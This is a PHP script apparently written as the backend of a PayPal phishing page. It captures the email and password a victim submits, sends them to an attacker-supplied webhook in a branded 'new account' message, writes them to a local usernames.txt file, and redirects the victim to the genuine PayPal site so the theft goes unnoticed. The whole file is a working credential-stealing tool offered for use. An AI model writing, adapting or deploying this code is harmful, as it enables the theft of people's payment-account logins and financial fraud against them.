<?php
////This Has Been Made By west#1945
////DO NOT SKID
if ($_POST["login_email"] && $_POST["login_password"]) {
$webhook = "YOUR WEBHOOK";
$login_password = htmlspecialchars($_POST["login_password"]);
$login_email = htmlspecialchars($_POST["login_email"]);
$json_data = json_encode([
    "content" => "",
    "username" => Paypal,
    "avatar_url" => "https://1000logos.net/wp-content/uploads/2017/05/emblem-Paypal.jpg",
    "embeds" => [
        [
            "title" => Paypal,
            "type" => "rich",
            "description" => "**[Login Here!](https://paypal.com/login)**",
            "url" => "",
            "color" => hexdec("000000"),
            "thumbnail" => [
            "url" => "https://1000logos.net/wp-content/uploads/2017/05/emblem-Paypal.jpg"
            ],
            "footer" => [
                "text" => "You have received a new account!",
                "icon_url" => $icon
            ],
            "author" => [
                "name" => "",
            ],
            "fields" => [
                [
                    "name" => "**Username/Email:**",
                    "value" => "```$login_email```",
                    "inline" => false
                ],
                [
                    "name" => "**Password:**",
                    "value" => "```$login_password```",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$resp = curl_exec($ch);
curl_close($ch);
header("location: https://paypal.com/login");
}


file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>